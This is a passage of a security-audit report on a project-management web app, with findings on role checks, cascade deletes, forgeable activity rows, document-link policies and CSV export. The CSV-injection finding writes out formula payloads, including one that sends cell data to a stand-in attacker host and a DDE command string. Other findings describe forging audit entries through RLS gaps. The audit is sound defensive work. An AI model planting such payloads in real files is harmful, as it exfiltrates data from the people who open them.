> **Verifier correction.** The worked example is wrong and must not be repeated. org_members.role is maintained as the HIGHEST-RANKED role in roles[] (20260722_member_roles_collection.sql:6-9; enforced on the only write path, app/(protected)/admin/users/page.tsx:129-137, `.update({ roles: cleaned, role: headline })` with headline = primaryRole(cleaned)). ROLE_RANK (lib/roleCapabilities.ts:74-93) puts DocCtrl at 70 and Engineer-4 at 64, so roles=['Engineer','DocCtrl'] mirrors role='DocCtrl' and the helper ACCEPTS it. The divergence is real only for a member holding a higher-ranked non-controller role alongside DocCtrl — Manager (90), Supervisor (80) or DraftingSupervisor (75) + DocCtrl mirrors role='Manager'/'Supervisor'/'DraftingSupervisor', which is a controller to Postgres and to the UI but throws 'Only the project owner or an admin can do this.' here — or for any row where roles[] was written without the mirror (e.g. app/api/admin/create-user/route.ts:161 `.update({ roles: [role] })` alone).

**Done when.**

- [ ] assertCanManageProject selects `role, roles` and treats a member as a controller when either the scalar or the array contains a controller role — matching is_org_controller exactly
- [ ] the controller role list is read from the shared role/capability helper (lib/roleCapabilities.ts / lib/permissions.ts) rather than the literal ['Admin','DocCtrl'] repeated in application code
- [ ] a test asserts a member with role='Engineer', roles=['Engineer','DocCtrl'] can transition, edit, delete and transfer a project they do not own
- [ ] every other server-side ['Admin','DocCtrl'] literal in the projects area is audited for the same scalar-only lookup

**Resolution (2026-09-30, projects Round G).** Record-only for dw1 / dw3 / dw4, per the plan: roles-and-permissions ADD-1 already made `assertCanManageProject` select `role, roles` and use `normalizeRoles` (verified at `2a2ae73`, `lib/projects.ts:656-658`), and `lib/__tests__/sweepRoundC1b.test.ts` is the repo-wide literal census. Residual done here (dw2, DEC-35): the literal `r === "Admin" || r === "DocCtrl"` is replaced by `isControllerPrincipal` from `lib/permissions.ts` — the same rule as `is_org_controller`. `assertCanManageProject` now also requires an ACTIVE membership before the owner branch (projects-tab `SEC-9`).
- Commit: `7ca202f`
- Tests: `projects.test.ts` "PM-5 / SEC-9 — who may manage a project" — a member with role `Manager`, roles `['Manager','DocCtrl']` and one with role `Engineer`, roles `['Engineer','DocCtrl']` both manage a project they do not own; `Manager` alone does not; a suspended owner does not.

**Done-when.**
- Selects `role, roles` and treats either as the controller signal — ✓ (ADD-1; kept).
- The controller role list comes from the shared helper — ✓ (`isControllerPrincipal`).
- A test asserts role='Engineer', roles=['Engineer','DocCtrl'] can manage a project they do not own — ✓.
- Every other server-side ['Admin','DocCtrl'] literal in the projects area is audited — ✓ by pointer (ADD-1's census, `sweepRoundC1b.test.ts`).

**Scope / residual.** The page's `hasAnyRole(["Admin", "DocCtrl"])` is the client's collection-aware check (RoleContext), unchanged.

---

<a id="pm-6"></a>

## PM-6 · deleteProject cascade-destroys the project's entire cost AND quality record (PSSR checklists, turnover acceptance, punch list, change orders, cost entries), while the confirmation dialog promises only 'the project and its schedule'

- **Severity:** HIGH
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `lib/projects.ts:597-617`, `app/(protected)/projects/[id]/page.tsx:400-414`, `supabase/migrations/20261013_project_controls_program.sql:117,142,156,175,194`, `supabase/migrations/20260819_orphan_tables_backfill.sql:141,162,182,205`, `supabase/migrations/20260609_phase1_normalization.sql:69`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Confirmed on every leg. I looked for a BEFORE DELETE guard, an archive-instead-of-delete path, or a retention/legal-hold trigger on projects — none exists (20260826_legal_hold_delete_guard.sql attaches triggers only to `documents` and `document_versions`). The audit row at lib/projects.ts:612-616 carries `details: { name: p.name }` and no count of what was destroyed.

**Mechanism.** deleteProject explicitly unlinks only what it knows about — `checkout_sessions.project_id = null`, `markup_requests.project_id = null`, `milestones` deleted, `project_activity` deleted, `project_members` deleted — then `DELETE FROM projects`. Everything else is left to the FK cascade, and the enumeration of `REFERENCES projects(id)` shows what that means:

- ON DELETE CASCADE: project_documents, project_parties, cost_accounts (→ cost_entries CASCADE), cost_documents, cost_entries, change_orders, project_checklists (→ checklist_items CASCADE), turnover_items, punch_items
- ON DELETE SET NULL: notes, transmittals, company_events, milestones

So one click silently erases every budget line, every posted commitment and actual, every change order and its reason code, every PSSR/MI/QA-QC checklist and its item-level evidence links and AI rationales, every turnover item with its reviewer sign-off and review_note, and the punch list. The confirm text is:

```
Delete "${project.name}"? This permanently removes the project and its schedule. Document checkouts are kept (just unlinked). This cannot be undone.
```

No mention of money or quality. The audit row records only `details: { name: p.name }` — not the counts or contents destroyed. There is no retention/legal-hold check (contrast 20260826_legal_hold_delete_guard.sql, which exists for documents) and no export-before-delete. cost_documents.file_url objects in R2 are orphaned. Separately, the delete sequence is non-transactional and destroys the roster, feed and schedule BEFORE attempting the projects DELETE — a failure at the last step leaves a live project stripped of its history.

**Failure scenario.** An Admin cleans up 'old projects'. A completed 2026 turnaround is deleted. Gone with it: the PSSR checklist showing which items were satisfied and by which document, the turnover package acceptance record with reviewer names and dates, 40 punch items, four change orders with reason codes that fed the contractor's permanent score, and the whole cost ledger. Six months later an OSHA PSM audit asks for the PSSR completion evidence for that unit. The evidence pack cannot be regenerated — gatherProjectEvidence reads projects/project_members/milestones/audit_logs/transmittals, all of which are also gone or nulled. audit_logs retains one PROJECT_DELETED row naming the project.

**Evidence.**

```
lib/projects.ts:604-610 is the complete pre-delete cleanup — five statements, none touching cost_*, change_orders, project_checklists, turnover_items, punch_items, project_parties, project_documents. FK proof: 20261013_project_controls_program.sql:117 `project_id UUID NOT NULL REFERENCES projects(id) ON DELETE CASCADE` (change_orders), :142 (project_checklists), :175 (turnover_items), :194 (punch_items); 20260819_orphan_tables_backfill.sql:141/162/182/205 (project_parties, cost_accounts, cost_documents, cost_entries). Confirm text quoted from page.tsx:407.
```

> **Verifier correction.** Two smaller nits: the delete path is owner-or-controller-gated by assertCanManageProject (:601), so this is destructive-by-authorized-user, not an authorization hole; and cost_documents.file_url objects are R2 keys, so the orphaned-object claim is an inference from the key column, not from any storage call in this function.

**Done when.**

- [ ] the delete confirmation enumerates exactly what will be destroyed, driven by live counts (budget lines, cost entries, change orders, checklists + items, turnover items, punch items, parties, document links)
- [ ] a project carrying financial or quality records cannot be hard-deleted — it is archived/soft-deleted, or deletion requires a controller plus an explicit second confirmation and writes those counts (and ideally a serialized snapshot) into the PROJECT_DELETED audit details
- [ ] the retention / legal-hold guard that protects documents is extended to projects
- [ ] the pre-delete cleanup either runs inside one RPC/transaction or is ordered so the projects DELETE is attempted first, so a failure cannot leave a live project with its roster, feed and schedule already destroyed
- [ ] R2 objects referenced by the deleted cost_documents.file_url are queued for the orphan sweep rather than silently stranded

**Resolution (2026-09-30, projects Round G).** Worked as one defect with `QUAL-3` (and projects-tab `SEC-9`'s decision). Reproduced: `deleteProject` stripped the roster, feed and schedule BEFORE the projects DELETE, cascaded the cost and quality record, and audited `{ name }`. Decision `DEC-44` (the plan's default): a project carrying ANY cost or quality row is archived, not deleted — hard delete of such a project is a controller's act with a stated reason; a project under `projects.legal_hold` is deleted by nobody.
- `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql`: `delete_project_record(project, reason)` — SECURITY DEFINER, owner or controller, row locked; refuses a held project; refuses a project with records unless the caller is a controller AND gives a reason; counts every table (`counts`), snapshots the cost and quality rows (`snapshot`; `parsed` quote bodies left out), records the cost documents' storage keys (`orphanedStorageKeys` — PM-6 dw5: recorded for the orphan sweep, whose collector is admin-and-org BKP-2 / intelligence ILIFE-1), revokes the project's intake links (`PM-2`'s inline limb), writes `PROJECT_DELETED` with all of it, and only THEN deletes — children first in an order that fires no ON DELETE SET NULL update on a guarded row, then the schedule, then the project — one transaction, under `app.record_purge = 'project:<id>'` (the GUC contract shared with PC-7 / J3's money guards, spelled exactly). `enforce_project_delete_guard` (BEFORE DELETE on projects) refuses any other delete of a project with records, and a held project always; `project_regulated_record_count` is the one count (EXECUTE revoked from every client role).
- `lib/projects.ts` `deleteProject` calls the RPC; before `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` it deletes only a record-less project (every count read and zero), the projects row FIRST — and it must come back from the DELETE (RETURNING), else "Nothing was deleted" and neither the schedule nor the audit row is touched — then the schedule rows it named, audited with the counts — anything else is refused ("archive it instead"). `countProjectRecords` / `describeProjectRecords` / `regulatedRecordTotal` drive the confirm: the page lists the live counts; a non-controller is told the project can't be deleted and to archive it; a controller confirms, then gives a reason.
- Commits: `7ca202f`, `e0c1aa2`, `9363ebb`
- Tests: `projects.test.ts` "PM-6 / QUAL-3 — deleting a project counts, audits and refuses" (the RPC with the reason; the database refusal reaches the user; pre-migration: a project with records is refused with nothing deleted; a record-less one deletes the project row first then the schedule, audited with counts; an unreadable count is unknown, never zero); `projectRailsMigration.test.ts` "20261103 — PM-6 / QUAL-3" (GUC spelling, controller + reason, audit before the first delete, the delete order, the guard); `projectPageRoundG.test.ts` "PM-6 / QUAL-3 — the delete confirm".
- Pending migration: `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` (inventory: projects carrying cost / quality rows — each can now only be archived or deleted by a controller with a reason).

**Done-when.**
- The confirmation enumerates exactly what will be destroyed, driven by live counts — ✓.
- A project carrying financial or quality records cannot be hard-deleted — archive, or a controller plus an explicit second confirmation that writes the counts and a snapshot — ✓.
- The retention / legal-hold guard reaches projects — ✓ (`projects.legal_hold`, controller-set, blocks the project and every regulated row).
- The cleanup runs inside one transaction or deletes the project first — ✓ (one RPC; the pre-migration path deletes the project row first).
- R2 objects of deleted cost documents are queued for the orphan sweep — ✓ recorded (`orphanedStorageKeys` in the audit row); the collector is BKP-2 / ILIFE-1's.

**Scope / residual.** `audit_logs` is org-readable (`SEC-20` in projects-tab): the `PROJECT_DELETED` snapshot of a private project is as readable as that project's other controls audit rows already are. *Fix pass (2026-09-30):* the pre-migration path did not check that the projects DELETE removed a row — a policy-filtered delete (zero rows, no error) still deleted the schedule and wrote `PROJECT_DELETED` for a project that was still live. `legacyDeleteRecordlessProject` now deletes with `.select("id")` and throws "Nothing was deleted…" on zero rows before touching the schedule or the audit trail; the contractor links it revoked first stay revoked (the fail-safe order) and the message says so. Test: `projects.test.ts` "without 20261103 a DELETE the policy filters to zero rows deletes no schedule and audits no PROJECT_DELETED".

---

<a id="pm-7"></a>

## PM-7 · project_activity attribution is forgeable and cross-project: the INSERT policy checks only org membership, not the actor's identity, the project's visibility, or that the project belongs to that org

- **Severity:** HIGH
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `supabase/migrations/20260906_projects_hardening.sql:117-121`, `supabase/migrations/20260913_projects_rls_recursion_fix.sql:89-92`, `lib/projects.ts:169-186`, `lib/projects.ts:430-454`, `lib/projects.ts:680-709`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Verified the claim of absence repo-wide: no trigger on project_activity exists anywhere in supabase/migrations, and no later migration re-creates the insert policy. Because project_id is unchecked while org_id is the only thing validated, a member of org A can also plant a row against a project in org B (the SELECT policy then keys visibility off project_visible_to_me(project_id), so org B reads it).

**Mechanism.** The write policy is:

```sql
CREATE POLICY project_activity_insert ON project_activity FOR INSERT WITH CHECK (
  EXISTS (SELECT 1 FROM org_members WHERE org_id = project_activity.org_id
          AND uid = auth.uid() AND status = 'active')
);
```

Three gaps compose:
(a) `user_id` / `user_name` are unconstrained — nothing requires `user_id = auth.uid()`. writeActivity passes them straight through from the caller (`user_id: input.userId || null, user_name: input.userName || null`), and these are client-supplied parameters on the browser RLS client. Any active org member can author an activity/comment row attributed to the plant manager.
(b) `project_id` is unconstrained — a member can insert into a project they cannot READ (private projects are hidden by projects_visibility_select / project_visible_to_me on SELECT only).
(c) `org_id` and `project_id` are not required to agree. The read policy is `USING (project_visible_to_me(project_activity.project_id))` — keyed on the PROJECT, not the org. So a row inserted with org_id = my org and project_id = a project in another org passes WITH CHECK and is then returned to that other org's members.
There is no UPDATE policy on project_activity at all (full inventory via `grep -rn 'ON project_activity' … | grep -i policy`), so a forged row cannot even be corrected — only deleted by the project owner or a controller.

**Failure scenario.** A contractor-account Viewer posts a project_activity row with `type:'comment'`, `user_id` = the Process Safety lead's uid, `user_name` = their email, body 'Confirmed with operations — line can stay in service, hold released.' It renders in the Activity tab through TimelineFeed as that person's comment, is picked up by the project timeline (lib/timeline.ts getProjectTimeline reads project_activity for the project), and appears verbatim in any later dispute about who authorised what. Going the other way, the same member inserts rows into a private MOC project they cannot open, and the members who CAN open it see fabricated status_changed / doc_removed events in the project's record.

**Evidence.**

```
20260906_projects_hardening.sql:118-121 quoted above — the WITH CHECK names only org_members and project_activity.org_id. lib/projects.ts:171-179: `await supabase.from("project_activity").insert({ project_id: input.projectId, org_id: input.orgId, user_id: input.userId || null, user_name: input.userName || null, type: input.type, body: input.body || null, metadata: input.metadata || null, created_at: now });`. Read side: 20260913_projects_rls_recursion_fix.sql:90-92 `USING (project_visible_to_me(project_activity.project_id))`.
```

> **Verifier correction.** Sub-claims (a) forged user_id/user_name and (b) insert into an unreadable private project are CONFIRMED from the policy text. Sub-claim (c), the cross-org row, is real in the same way but should be graded SUSPECTED: it additionally requires the attacker to already hold a project UUID belonging to another org, which nothing in the app hands them.

**Done when.**

- [ ] project_activity_insert WITH CHECK requires `user_id = auth.uid()` (or user_id IS NULL for system rows written by a SECURITY DEFINER helper), and `org_id = project_org(project_id)`
- [ ] the insert is additionally gated on project_visible_to_me(project_id) so a member cannot write into a project they cannot read
- [ ] comment posting goes through a path that stamps identity server-side rather than accepting actorUserId/actorEmail from the client
- [ ] existing rows where user_id does not correspond to an active member of project_org(project_id) are surfaced for review — forged history already in the table stays there otherwise

**Resolution (2026-09-30, projects Round G).** Reproduced: `project_activity_insert` (20260906:117-121) checked only that the caller is an active member of the ROW's `org_id`. `supabase/migrations/20261102_prj_roundG_project_rails.sql` section 3: the policy now requires `user_id = auth.uid()`, `org_id = project_org(project_id)` and `project_visible_to_me(project_id)`; a `comment` needs a controller or `can_manage_project` (an observer cannot post — `PM-11`); a `doc_added` / `doc_removed` row needs the register's authority (controller or active owner). `trg_project_activity_stamp` (BEFORE INSERT, SECURITY DEFINER, `search_path` pinned) stamps `user_id`, `user_name` (the member's email) and `created_at` from the SESSION for a signed-in caller — the author of a feed row is who wrote it, whatever the client sent (dw3: identity is server-stamped; the lib's `userId` / `userName` are a pre-migration fallback only). No UPDATE policy. `writeActivity` is checked (`PM-9`).
- Commits: `e0c1aa2`, `7ca202f`
- Tests: `projectsRls.test.ts` "PM-7 — the project feed" (final policy set: the four terms; no UPDATE / ALL policy); `projectRailsMigration.test.ts` "20261102 — PM-7 / PM-9 / PM-11: the feed" (the stamp trigger's body); `projects.test.ts` "a refused insert comes back as text (never a throw); writeActivityChecked throws it…".
- Pending migration: `supabase/migrations/20261102_prj_roundG_project_rails.sql` — its inventory reports the rows whose author is not an active member of the project's org (dw4: surfaced for review, never rewritten).

**Done-when.**
- WITH CHECK requires `user_id = auth.uid()` and `org_id = project_org(project_id)` — ✓ (system rows are written by the service role, which bypasses RLS, or by SECURITY DEFINER RPCs that name the actor).
- The insert is gated on `project_visible_to_me(project_id)` — ✓.
- Comment posting stamps identity server-side — ✓ (the stamp trigger).
- Existing rows whose author is not an active member are surfaced for review — ✓ (the inventory count; the review query is the inventory's WHERE clause).

**Scope / residual.** None beyond the pending migration.

---

<a id="pm-8"></a>

## PM-8 · project_documents grants every active org member full ALL access — any Viewer can attach or detach documents from any project, including private ones

- **Severity:** MEDIUM
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `supabase/migrations/20260609_phase1_normalization.sql:192-197`, `supabase/migrations/20260609_phase1_normalization.sql:66-75`, `components/projects/ProjectDocumentsCard.tsx:119-144`, `app/(protected)/projects/[id]/page.tsx:461-471`
- **Independently verified:** ✓ **SURVIVES, corrected** — second independent adversarial pass. Severity **HIGH → MEDIUM** by this pass. The authorization gap is real and exactly as described — any active org member, Viewer included, can INSERT or DELETE project_documents rows for any project including private ones, with no activity trail (the `doc_added`/`doc_removed` writes at ProjectDocumentsCard.tsx:111-117 only happen on the UI path). Lowering to MEDIUM because the blast radius is the link row and its provenance (source, first_seen_at), not any document: `documents` rows survive untouched, and nothing in the evidence pipeline reads project_documents (gatherProjectEvidenceState in lib/checklists.ts:238-294 sources titles from intake_collection_id, sow_document_id and turnover_items.document_id, never from project_documents).

**Mechanism.** The previous audit's claim is verified: project_documents has exactly ONE policy, and it is a FOR ALL with the same org-membership predicate on both sides:

```sql
CREATE POLICY "project_documents_member_all" ON project_documents
  FOR ALL TO authenticated
  USING (EXISTS (SELECT 1 FROM org_members WHERE org_id = project_documents.org_id AND uid = auth.uid() AND status = 'active'))
  WITH CHECK (EXISTS (SELECT 1 FROM org_members WHERE org_id = project_documents.org_id AND uid = auth.uid() AND status = 'active'));
```

Two differently-shaped searches (`grep -rn 'ON project_documents' supabase/` and `grep -rniE 'policy ["a-z_]*project_doc' supabase/`) find no later policy anywhere — 20260906 hardened projects, project_members, project_activity, markup_requests and the cost tables but left this join table untouched. The predicate names neither the project nor its visibility nor its roster, so a Viewer can INSERT a link row pointing at ANY project_id in the org (private projects included — visibility is only enforced on the projects/project_activity SELECT paths), UPDATE `source`/`project_id`/`document_id` on existing rows, and DELETE the project's whole document register. The UI's `canManage` prop (page.tsx:467, `canManage={!!canManage}` where canManage = isOwner || isAdmin) is the only thing hiding the buttons; it is client state, and ProjectDocumentsCard writes with the browser RLS client (`supabase.from("project_documents").upsert(...)` / `.delete().eq("id", r.linkId)`).

**Failure scenario.** A Viewer opens devtools on the projects page and issues one PostgREST DELETE against project_documents for a private capital-project id. The project's Documents register — including every document adopted through contractor intake, which exists ONLY as a project_documents row (the card's own header comment says so) — is emptied. Nothing is audited: ProjectDocumentsCard writes the doc_added/doc_removed activity row only on the UI path, and project_documents has no trigger. The same Viewer can instead INSERT links pointing a private MOC project at unrelated drawings, which then appear on that project's register and in its CSV export (lib/projectExport.ts:42).

**Evidence.**

```
supabase/migrations/20260609_phase1_normalization.sql:194-197 is quoted above verbatim. The table itself is `UNIQUE (project_id, document_id)` with `project_id UUID NOT NULL REFERENCES projects(id) ON DELETE CASCADE` (:69) — no org/project consistency check, so a row's org_id need not match its project's org_id. components/projects/ProjectDocumentsCard.tsx:138: `await supabase.from("project_documents").delete().eq("id", r.linkId);`
```

> **Verifier correction.** Note for the parent: this table is one of the four the roles-and-permissions audit already named for the FOR-ALL pattern, so report it as a cross-reference to that finding rather than a new one. The one genuinely new detail here is the missing org/project consistency check on the join row, which lets a row's org_id diverge from its project's org.

**Done when.**

- [ ] project_documents is split into a member SELECT policy (gated on project_visible_to_me(project_id), matching project_activity) and a write policy limited to is_org_controller(org_id) OR is_project_owner(project_id)
- [ ] the WITH CHECK also asserts org_id = project_org(project_id) so a row cannot be stamped with a different org than its project
- [ ] the trigger-maintained 'checkout' rows remain insertable by checkouts_resync_project_documents (it runs as the invoking user — confirm it still succeeds for a collaborator checking a doc out, or make it SECURITY DEFINER with a pinned search_path)
- [ ] attach/detach writes a doc_added/doc_removed row that the actor cannot forge (see the project_activity finding)

**Resolution (2026-09-30, projects Round G).** Same defect as projects-tab `SEC-17` (worked there; drafting-flow `PROJ-3` closes by pointer). `supabase/migrations/20261102_prj_roundG_project_rails.sql` section 4 DROPS `project_documents_member_all` and creates `project_documents_select` (`project_visible_to_me(project_id)`), `_insert` / `_update` (`is_org_controller(org_id) OR is_project_owner(project_id)` AND `org_id = project_org(project_id)`), `_delete` (owner or controller). `checkouts_resync_project_documents` is re-created SECURITY DEFINER with `search_path` pinned (20260609's body, lineDiff-pinned, plus a guard linking only a session whose org is its project's org, and — for a signed-in caller — only the caller's OWN session into a project the caller can see), so a collaborator's checkout still lands its row and nobody plants one through the definer. `ProjectDocumentsCard` writes `doc_added` / `doc_removed` through `writeActivity` — checked, author stamped by the database (`PM-7`), and only the register's authority may write those types.
- Commits: `e0c1aa2`, `9363ebb`
- Tests: see projects-tab `SEC-17`; `projectPageRoundG.test.ts` "a refused feed row after a successful detach is shown, not swallowed".
- Pending migration: `supabase/migrations/20261102_prj_roundG_project_rails.sql` (inventory: rows whose org is not their project's org).

**Done-when.**
- Split into a visibility-gated SELECT and a write policy limited to `is_org_controller(org_id) OR is_project_owner(project_id)` — ✓.
- WITH CHECK asserts `org_id = project_org(project_id)` — ✓.
- The trigger-maintained rows remain insertable for a collaborator — ✓ (SECURITY DEFINER, pinned).
- Attach / detach write a feed row the actor cannot forge — ✓ (stamped author; type-gated insert).

**Scope / residual.** Pending migration. *Fix pass (2026-09-30):* the first cut made the resync trigger SECURITY DEFINER with only an org guard; `checkout_sessions` is writable by any active member and its `project_id` is not guarded, so one INSERT (or a PATCH of someone else's session) still planted a `checkout` register row in any same-org project, private ones included — the door this finding closes, one table over. `checkouts_resync_project_documents` now returns without linking when `auth.uid() IS NOT NULL AND (NEW.user_id IS DISTINCT FROM auth.uid() OR NOT project_visible_to_me(NEW.project_id))` (every app insert of a session carries the caller's own `user_id`; the service role and the SQL editor still link); lineDiff-pinned and probed in the paste-back — see projects-tab `SEC-17`. Owner-or-controller writes also refuse two writers in other packages that swallow the error, recorded in `DEC-44` and handed to their owners: the split / merge register carry-over (`lib/documentLifecycle/common.ts` `copyProjectMembershipToDoc`, document-control — a document owner who does not own every project listing the document gets the whole upsert refused, so the new sheets fall out of every project's register) and `adoptDocument`'s register link (`lib/transitionIn.ts`, projects-and-cost PC-1 / J1 — a collaborator's adoption is not linked). Each should surface the refusal or route the write through the register's authority.

---

<a id="pm-9"></a>

## PM-9 · Posting a comment or any activity never advances projects.last_activity_at for non-owners — the UPDATE is silently filtered out by RLS and the error is discarded

- **Severity:** MEDIUM
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `lib/projects.ts:169-186`, `supabase/migrations/20260906_projects_hardening.sql:60-65`, `app/(protected)/projects/page.tsx:61-88`, `lib/projects.ts:199-230`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Confirmed, including the claim of absence: grep over supabase/ finds `last_activity_at` only at 20260527_projects_and_collaboration.sql:42 (column) and :52 (index) — no trigger and no RPC maintains it, so the client UPDATE is the only writer. For a non-owner non-controller the UPDATE matches zero rows under RLS (not an error), and the return value is discarded, so every collaborator-driven comment/attach/join leaves the timestamp stale.

**Mechanism.** writeActivity's second statement is the sort-key touch:

```ts
// Touch last_activity_at so the list view sorts correctly.
await supabase
  .from("projects")
  .update({ last_activity_at: now, updated_at: now })
  .eq("id", input.projectId);
```

The only UPDATE policy on projects (full inventory via `grep -rn 'ON projects' … | grep -i policy` — 20260615's blanket projects_member_all is dropped by 20260906:49) is:

```sql
CREATE POLICY projects_update_owner ON projects FOR UPDATE USING (
  is_org_controller(org_id) OR owner_user_id::text = auth.uid()::text
) WITH CHECK (…);
```

For a collaborator, RLS does not raise — it filters the row out of the UPDATE's scope. PostgREST returns success with zero rows affected, and writeActivity binds no error variable at all, so both the insert and the update are unchecked (the supabase-js `{error}`-not-throw pattern, twice in one 18-line function). Every activity type routed through writeActivity is affected: comments, checkout_added, member_joined/left, doc_added/doc_removed, ownership_transferred.

**Failure scenario.** A five-person project runs for three weeks: daily comments, documents attached, members joining — all by collaborators, none by the owner. projects.last_activity_at still holds the creation timestamp. The projects list is ordered `.order("last_activity_at", { ascending: false })` (lib/projects.ts:204), so the most active job in the plant sinks to the bottom of the Active tab, below dormant projects whose owners happened to rename them. Any 'stale project' logic keyed on last_activity_at — the column's stated purpose per 20260527_projects_and_collaboration.sql:41-42 ('Last activity drives "stale" warnings and sort order') — flags it as abandoned while it is the busiest thing on site.

**Evidence.**

```
lib/projects.ts:181-185 quoted above, with the comment 'Touch last_activity_at so the list view sorts correctly' directly above the statement that cannot succeed for the majority of callers. Policy at 20260906_projects_hardening.sql:61-65. The insert on lines 171-180 is equally unchecked, so an RLS or CHECK rejection of the activity row itself also reads as success.
```

> **Verifier correction.** Severity downgraded to MEDIUM. The activity row itself inserts fine (project_activity_insert allows any active org member), so comments and feed entries are not lost — only the list-view sort key goes stale for collaborator-authored activity. One caveat the finding should carry: CATCHUP_2026-05-28.sql:884-887 re-declares the blanket `projects_member_all` FOR ALL policy; it is a bundle of pre-20260609 migrations and 20260906 drops that policy by name, but on a database where the CATCHUP file was replayed last the UPDATE would succeed and this finding would not reproduce.

**Done when.**

- [ ] last_activity_at is maintained by an AFTER INSERT trigger on project_activity (SECURITY DEFINER, search_path pinned) rather than by a client UPDATE that RLS filters
- [ ] writeActivity binds and inspects the error from both statements and surfaces a real failure instead of returning void unconditionally
- [ ] posting a comment as a collaborator is verified to move the project to the top of the Active list
- [ ] any existing stale-warning logic is re-checked against back-filled last_activity_at values (currently understated for most projects)

**Resolution (2026-09-30, projects Round G).** Reproduced: `writeActivity` bound neither error and its `UPDATE projects SET last_activity_at` is filtered out by RLS for every non-owner. `supabase/migrations/20261102_prj_roundG_project_rails.sql`: `trg_project_activity_touch_project` (AFTER INSERT, SECURITY DEFINER, `search_path` pinned) advances `projects.last_activity_at` to the row's time for EVERY author, and a one-time backfill sets it to each project's newest feed row. `writeActivity` no longer UPDATEs `projects` (nor `updated_at`, which is the edit stamp) and returns a refused insert as TEXT ("The project activity row was not written: …", null when written) — it never throws, the exported contract its callers in other packages await bare between their committed write and their audit row (`components/documents/CheckoutFlowModal.tsx` before `CHECK_OUT`, `lib/markupRequests.ts` before `MARKUP_*`); `writeActivityChecked` throws, for `postComment`, whose feed row IS the action. A feed row written AFTER its change committed reports the refusal without pretending the change failed (`createProject` / `transitionProjectStatus` / `bulkCheckoutToProject` carry it in the audit row or result; member, checkout and edit actions say "saved, but the project feed row was not written" after their notices).
- Commits: `7ca202f`, `e0c1aa2`
- Tests: `projects.test.ts` "PM-7 / PM-9 — the feed write is checked and no longer touches projects" (a refusal comes back as text; `writeActivityChecked` throws it; "the exported writeActivity never rejects — its callers in other packages await it bare after their main write has committed"); `projectRailsMigration.test.ts` "last_activity_at is advanced by an AFTER INSERT trigger for every author, and backfilled".
- Pending migration: `supabase/migrations/20261102_prj_roundG_project_rails.sql` — until it is applied NO author's activity advances `last_activity_at` (the client UPDATE that worked only for owners is gone); the inventory reports how many projects the backfill advances.

**Done-when.**
- last_activity_at maintained by an AFTER INSERT trigger — ✓.
- writeActivity binds and inspects the error — ✓ (there is now one statement; the refusal is returned, never dropped by the lib).
- A collaborator's comment moves the project to the top of the Active list — ✓ by construction (the trigger + `listProjects`' `order("last_activity_at", desc)`); live after `supabase/migrations/20261102_prj_roundG_project_rails.sql`.
- Stale-warning logic re-checked against back-filled values — ✓: the only consumer is the dashboard's quiet-days column (`components/dashboard/widgets.tsx:940-988`), which reads the same column and needs no change.

**Scope / residual.** Pending migration. *Fix pass (2026-09-30):* the first cut made the exported `writeActivity` THROW on a refusal and moved only this package's callers to a non-throwing wrapper; the two callers in other packages still awaited it bare after their main write — a refused feed row (realistic after 20261102: a markup responder need not be on a private project's roster) would have skipped the `CHECK_OUT` / `MARKUP_*` audit row, told the user a saved checkout or share had failed, and invited a duplicate markup request on retry. The exported contract is non-throwing again (it returns the refusal), and the throwing variant has its own name. Residual, handed to the owners: those two call sites discard the returned text — document-control (checkout, `CheckoutFlowModal.tsx`) and drafting-flow (`lib/markupRequests.ts`) can carry it into their audit details with a one-line change each.

---

<a id="pm-10"></a>

## PM-10 · Project CSV export writes unescaped formula characters — project names and descriptions become live formulas when the file opens in Excel

- **Severity:** MEDIUM
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `lib/projectExport.ts:12-22`, `lib/projectExport.ts:70-91`, `lib/projectExport.ts:94-105`, `app/(protected)/projects/[id]/page.tsx:323-331`, `app/(protected)/projects/page.tsx:103-114`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Correct — and note the quoting rule actively helps the payload: `=cmd|'/C calc'!A1` contains no comma/quote/newline, so it is emitted bare. The only sanitizer in the file is at :110, `String(bundle.project.name).replace(/[^a-z0-9-_ ]/gi, "_")`, which is applied to the download FILENAME only, not to the cell contents.

**Mechanism.** The only field treatment is quote-escaping:

```ts
function csvField(v: unknown): string {
  if (v == null) return "";
  const s = String(v);
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '\"\"')}"`;
  return s;
}
```

A leading `=`, `+`, `-`, `@`, tab or CR is passed through untouched, and quoting does not neutralise it — Excel evaluates a quoted cell beginning with `=` as a formula. Every value that reaches the file is user-controlled and org-wide writable-adjacent: project name, description, MOC ref, owner name, plus document_number/title and checkout user_name/purpose. A repo-wide search for any formula guard (`grep -rn 'CSV injection|formula injection|/^[=+@-]/' lib/`) returns nothing. The file is produced with a UTF-8 BOM and a .csv extension precisely so it opens in Excel (the module header says 'the goal here is "send it to someone in 10 seconds"'), and 'Export All' walks every project in the org.

**Failure scenario.** Any active org member creates a project (permitted by projects_insert_member) named `=HYPERLINK("https://evil.example/?d="&A2,"Open budget")` or a checkout purpose beginning with `=cmd|'/C calc'!A1`. A controller clicks Export All, opens projects-2026-08-22.csv in Excel and clicks through the enable-content prompt. The formula executes with the reviewer's credentials — exfiltrating adjacent cells via HYPERLINK/WEBSERVICE, or invoking DDE. The exported file is exactly the artefact people mail to a client or an auditor, so the payload travels outside the org.

**Evidence.**

```
lib/projectExport.ts:13-18 quoted verbatim — the regex `/[",\n\r]/` tests only for quote, comma and newline. lib/projectExport.ts:70-73 pushes `p.name`, `p.status`, `p.visibility`, `p.owner_user_name` through csvField unfiltered; :83 and :89 do the same for document titles and checkout purposes. Download path: :94-105 `new Blob(["﻿", content], { type: "text/csv;charset=utf-8" })` with `a.download = filename`.
```

